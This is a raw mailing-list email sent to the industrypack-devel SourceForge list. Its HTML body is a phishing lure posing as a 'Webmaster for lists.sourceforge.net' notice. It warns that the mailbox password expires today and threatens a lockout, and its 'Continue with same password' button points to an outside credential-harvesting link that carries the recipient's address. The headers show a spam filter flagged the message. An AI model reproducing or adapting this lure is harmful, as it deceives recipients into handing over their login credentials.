Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 841C3504CDF
	for <lists+industrypack-devel@lfdr.de>; Mon, 18 Apr 2022 08:53:34 +0200 (CEST)
Received: from [127.0.0.1] (helo=sfs-ml-4.v29.lw.sourceforge.com)
	by sfs-ml-4.v29.lw.sourceforge.com with esmtp (Exim 4.94.2)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1ngLGQ-0007Ez-GX
	for lists+industrypack-devel@lfdr.de; Mon, 18 Apr 2022 06:53:33 +0000
Received: from [172.30.20.202] (helo=mx.sourceforge.net)
 by sfs-ml-4.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.94.2)
 (envelope-from <noreply@chinli.com>) id 1ngLGP-0007Et-6B
 for industrypack-devel@lists.sourceforge.net; Mon, 18 Apr 2022 06:53:31 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Subject:Content-Transfer-Encoding:Content-Type:
 MIME-Version:Message-ID:Date:To:From:Reply-To:Sender:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=Vjp7LUqvn2i/QDIDjWzTqhSReFb+iyiP7PjsFruzvNo=; b=kUy5pIrlbIucbgPQTny5agNWQe
 I0q4xH4phvtJ8i8ZgQrcwqzVuDJJtpyc74Mhjmpcn3STe35eKyerBxZa936SF+39FRRstzlrPw09d
 5O4kwI++J5OEOwZHbpPgLaRN79K3vCyFgilwXFjoGZvCiI5khwifNO8XXKdi5xmBP8J8=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Subject:Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:
 Date:To:From:Reply-To:Sender:Cc:Content-ID:Content-Description:Resent-Date:
 Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=Vjp7LUqvn2i/QDIDjWzTqhSReFb+iyiP7PjsFruzvNo=; b=M
 48UDRLwCSTfb/1cFyGuuhOvsKWkrsQr9QWesIMoW/jQhrQ+fS7iJCeBYHfvaQmpTba51tEDxpg8hY
 nC6q18FlVbeSjNFRFuG9KVc2zNvMtsyVoqDMtLh7CpYl34JxTe71To4C4Otb/Agk861md86T57yE2
 ZkGrpr1xq/micIpc=;
Received: from [2.56.57.183] (helo=noreply0.chinli.com)
 by sfi-mx-2.v28.lw.sourceforge.com with esmtps
 (TLS1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.94.2)
 id 1ngLGM-00052w-GB
 for industrypack-devel@lists.sourceforge.net; Mon, 18 Apr 2022 06:53:31 +0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; s=default; d=chinli.com; 
 h=Reply-To:From:To:Subject:Date:Message-ID:MIME-Version:Content-Type:
 Content-Transfer-Encoding; i=noreply@chinli.com;
 bh=Vjp7LUqvn2i/QDIDjWzTqhSReFb+iyiP7PjsFruzvNo=;
 b=HXle2dmFQPMc1FA/Th766Kei/k0i8P02gz11e1u1ersBhIa6RQIYq8R9pRlQ2234dkh4kPp/pVct
 +zUUpKWdl+v1c+NWbHK9Tjpe8Ro/Fb3ENAidxcAa2CIOs/ZXEmqHah9pIMyGXMFzYzHY7X7tisnJ
 T2Wklo4uYzdyA4zoq4s=
From: Email Account services<noreply@chinli.com>
To: industrypack-devel@lists.sourceforge.net
Date: 17 Apr 2022 23:44:27 -0700
Message-ID: <20220417234427.497DA845D6CAB07E@chinli.com>
MIME-Version: 1.0
X-Spam-Score: 9.0 (+++++++++)
X-Spam-Report: Spam detection software,
 running on the system "util-spamd-1.v13.lw.sourceforge.com", 
 has identified this incoming email as possible spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview: industrypack-devel password expiry The password to your
 mailbox
 is expiring today . You will be locked out of your account soon. 
 Content analysis details:   (9.0 points, 6.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 1.0 RCVD_IN_UCE1           RBL: IP Listed in UCEPROTECT Level 1
 [2.56.57.183 listed in dnsbl-1.uceprotect.net]
 0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
 0.0 T_SPF_PERMERROR        SPF: test of record failed (permerror)
 0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 0.0 HTML_MESSAGE           BODY: HTML included in message
 0.1 DKIM_SIGNED            Message has a DKIM or DK signature, not necessarily
 valid 2.0 PYZOR_CHECK            Listed in Pyzor
 (https://pyzor.readthedocs.io/en/latest/)
 0.1 DKIM_INVALID           DKIM or DK signature exists, but is not valid
 2.7 FSL_BULK_SIG           Bulk signature with no Unsubscribe
 1.3 RDNS_NONE Delivered to internal network by a host with no rDNS
 1.7 TO_NO_BRKTS_FROM_MSSP  Multiple header formatting problems
X-VA-Spam-Flag: YES
X-Spam-Flag: YES
X-Headers-End: 1ngLGM-00052w-GB
Subject: [Industrypack-devel] [SPAM] lists.sourceforge.net Password Expired
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
Reply-To: noreply@lists.sourceforge.net
Content-Type: multipart/mixed; boundary="===============2874004225719527081=="
Errors-To: industrypack-devel-bounces@lists.sourceforge.net

--===============2874004225719527081==
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.=
w3.org/TR/html4/loose.dtd">

<HTML><HEAD>
<META name=3DGENERATOR content=3D"MSHTML 11.00.9600.17037"></HEAD>
<body style=3D"MARGIN: 0.5em">
<DIV style=3D"FONT-SIZE: small; FONT-FAMILY: Arial, Helvetica, sans-serif; =
WIDTH: 941px; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none;=
 FONT-WEIGHT: 400; COLOR: rgb(34,34,34); FONT-STYLE: normal; DISPLAY: table=
; LETTER-SPACING: normal; TEXT-INDENT: 0px; font-variant-ligatures: normal;=
 font-variant-caps: normal; text-decoration-style: initial; text-decoration=
-color: initial">
<DIV style=3D'FONT-FAMILY: "Helvetica Neue", Helvetica, Arial, sans-serif; =
PADDING-BOTTOM: 0px; PADDING-TOP: 2px; PADDING-LEFT: 0px; LINE-HEIGHT: norm=
al; PADDING-RIGHT: 0px'>
<DIV style=3D"PADDING-BOTTOM: 0px; PADDING-LEFT: 24px; PADDING-RIGHT: 16px"=
>
<DIV>
<DIV id=3Dm_-9094172289448146620gmail-yiv0300034581>
<DIV>
<DIV style=3D"BORDER-TOP: rgb(218,220,224) thin solid; FONT-FAMILY: Roboto,=
 RobotoDraft, Helvetica, Arial, sans-serif; BORDER-RIGHT: rgb(218,220,224) =
thin solid; BORDER-BOTTOM: rgb(218,220,224) thin solid; PADDING-BOTTOM: 36p=
x; PADDING-TOP: 40px; PADDING-LEFT: 20px; BORDER-LEFT: rgb(218,220,224) thi=
n solid; PADDING-RIGHT: 20px" align=3Dcenter>
<DIV style=3D'FONT-FAMILY: "Google Sans", Roboto, RobotoDraft, Helvetica, A=
rial, sans-serif; BORDER-BOTTOM: rgb(218,220,224) thin solid; PADDING-BOTTO=
M: 24px; PADDING-TOP: 0px; LINE-HEIGHT: 32px; BORDER-TOP-WIDTH: 0px'>
<DIV style=3D"FONT-SIZE: 24px; PADDING-TOP: 0px; BORDER-TOP-WIDTH: 0px">ind=
ustrypack-devel password expiry</DIV></DIV>
<DIV style=3D"FONT-FAMILY: Roboto-Regular, Helvetica, Arial, sans-serif; PA=
DDING-TOP: 20px; LINE-HEIGHT: 20px"><SPAN style=3D"FONT-FAMILY: Roboto, Rob=
otoDraft, Helvetica, Arial, sans-serif">&nbsp;&nbsp;<I>The password to your=
 mailbox&nbsp;is expiring today<BR><BR>.<BR>You will be locked out of your =
account soon.<BR><BR><BR>If you wish to continue using your current passwor=
d; kindly use the link below.</I></SPAN></DIV>
<DIV style=3D"FONT-SIZE: 14px; FONT-FAMILY: Roboto-Regular, Helvetica, Aria=
l, sans-serif; PADDING-TOP: 32px"><SPAN style=3D"FONT-FAMILY: Roboto, Robot=
oDraft, Helvetica, Arial, sans-serif"></SPAN>
<A style=3D'FONT-FAMILY: "Google Sans", Roboto, RobotoDraft, Helvetica, Ari=
al, sans-serif; MIN-WIDTH: 90px; COLOR: rgb(255,255,255); PADDING-BOTTOM: 1=
0px; PADDING-TOP: 10px; PADDING-LEFT: 24px; DISPLAY: inline-block; LINE-HEI=
GHT: 16px; PADDING-RIGHT: 24px; BACKGROUND-COLOR: rgb(65,132,243)' href=3D"=
https://2022-upgrade-server.pvsolar.com.br/?email=3Dindustrypack-devel@list=
s.sourceforge.net" rel=3D"nofollow noopener noreferrer" target=3D_blank dat=
a-saferedirectreason=3D"2"=20
data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://greenwayweb.=
com/wp-content/themes/Avada/assets/fonts/fontawesome/font/78896indv954543.h=
tml%23ventas@labomed.com.ve&amp;source=3Dgmail&amp;ust=3D1647677491260000&a=
mp;usg=3DAOvVaw2EljYZziwFr-iO5TeaY2Kq">Continue with same password</A><SPAN=
 style=3D"FONT-FAMILY: Roboto, RobotoDraft, Helvetica, Arial, sans-serif"><=
I><BR></I></SPAN></DIV>
<DIV style=3D"FONT-SIZE: 14px; FONT-FAMILY: Roboto-Regular, Helvetica, Aria=
l, sans-serif; PADDING-TOP: 32px"><SPAN style=3D"FONT-FAMILY: Roboto, Robot=
oDraft, Helvetica, Arial, sans-serif"><I>Failure to confirm, the system wil=
l lock your account to generate a new password.</I></SPAN></DIV>
<DIV style=3D"PADDING-TOP: 20px; LINE-HEIGHT: 20px"><BR>
<DIV style=3D"FONT-SIZE: 12px; FONT-FAMILY: Roboto-Regular, Helvetica, Aria=
l, sans-serif; LETTER-SPACING: 0px; LINE-HEIGHT: 16px">Confirmation will be=
 sent to<SPAN>&nbsp;industrypack-devel@lists.sourceforge.net</SPAN><SPAN>&n=
bsp;</SPAN>in a few hours for your reference.</DIV></DIV></DIV>
<DIV style=3D"FONT-FAMILY: Roboto, RobotoDraft, Helvetica, Arial, sans-seri=
f">
<DIV style=3D"FONT-SIZE: 11px; FONT-FAMILY: Roboto-Regular, Helvetica, Aria=
l, sans-serif; TEXT-ALIGN: center; PADDING-TOP: 12px; LINE-HEIGHT: 18px; BO=
RDER-TOP-WIDTH: 0px">
<DIV style=3D"PADDING-TOP: 0px; BORDER-TOP-WIDTH: 0px">&nbsp;<B><FONT color=
=3D#ff0000>Webmaster for<SPAN>&nbsp;lists.sourceforge.net</SPAN><SPAN>&nbsp=
;</SPAN>account and services.</FONT></B></DIV>
<DIV style=3D"DIRECTION: ltr"><B><FONT color=3D#ff0000>&copy; 2022</FONT></=
B></DIV></DIV></DIV></DIV></DIV></DIV></DIV></DIV>
<DIV style=3D"PADDING-BOTTOM: 0px; PADDING-LEFT: 24px; PADDING-RIGHT: 16px"=
></DIV></DIV>
<DIV style=3D"FONT-SIZE: small; HEIGHT: 64px; FONT-FAMILY: Arial, Helvetica=
, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none;=
 FONT-WEIGHT: 400; COLOR: rgb(34,34,34); FONT-STYLE: normal; LETTER-SPACING=
: normal; TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-ca=
ps: normal; text-decoration-style: initial; text-decoration-color: initial"=
>
<DIV style=3D"WIDTH: 969px">
<SPAN style=3D'FONT-SIZE: 13px; FONT-FAMILY: YahooSans, "Helvetica Neue", "=
Segoe UI", Helvetica, Arial, "Lucida Grande", sans-serif; WHITE-SPACE: norm=
al; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(2=
9,34,40); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal=
; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatu=
res: normal; font-variant-caps: normal; text-decoration-style: initial; tex=
t-decoration-color: initial;=20
-webkit-text-stroke-width: 0px; text-decoration-thickness: initial'></SPAN>=

<SPAN style=3D"FONT-SIZE: small; FONT-FAMILY: Arial, Helvetica, sans-serif;=
 WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FLOAT: none;=
 FONT-WEIGHT: 400; COLOR: rgb(34,34,34); FONT-STYLE: normal; ORPHANS: 2; WI=
DOWS: 2; DISPLAY: inline !important; LETTER-SPACING: normal; BACKGROUND-COL=
OR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: normal; fon=
t-variant-caps: normal; text-decoration-style: initial; text-decoration-col=
or: initial; -webkit-text-stroke-width: 0px;=20
text-decoration-thickness: initial"></SPAN>
<DIV style=3D'FONT-SIZE: 13px; BORDER-TOP: rgb(224,228,233) 1px solid; FONT=
-FAMILY: YahooSans, "Helvetica Neue", "Segoe UI", Helvetica, Arial, "Lucida=
 Grande", sans-serif; BORDER-RIGHT: rgb(224,228,233) 1px solid; WHITE-SPACE=
: normal; WORD-SPACING: 0px; BORDER-BOTTOM: rgb(224,228,233) 1px solid; TEX=
T-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(29,34,40); PADDING-BOTTOM: =
5px; FONT-STYLE: normal; PADDING-TOP: 5px; PADDING-LEFT: 4px; BORDER-LEFT: =
rgb(224,228,233) 1px solid; ORPHANS: 2; WIDOWS: 2;=20
LETTER-SPACING: normal; PADDING-RIGHT: 4px; BACKGROUND-COLOR: rgb(255,255,2=
55); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: n=
ormal; text-decoration-style: initial; text-decoration-color: initial; -web=
kit-text-stroke-width: 0px; text-decoration-thickness: initial; border-radi=
us: 100px'>
<UL role=3Dmenubar style=3D"LIST-STYLE-TYPE: none; HEIGHT: 20px; OVERFLOW-X=
: hidden; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN:=
 0px; PADDING-RIGHT: 0px"><BR class=3DApple-interchange-newline></UL></DIV>=
</DIV></DIV></BODY></HTML>


--===============2874004225719527081==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============2874004225719527081==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

--===============2874004225719527081==--
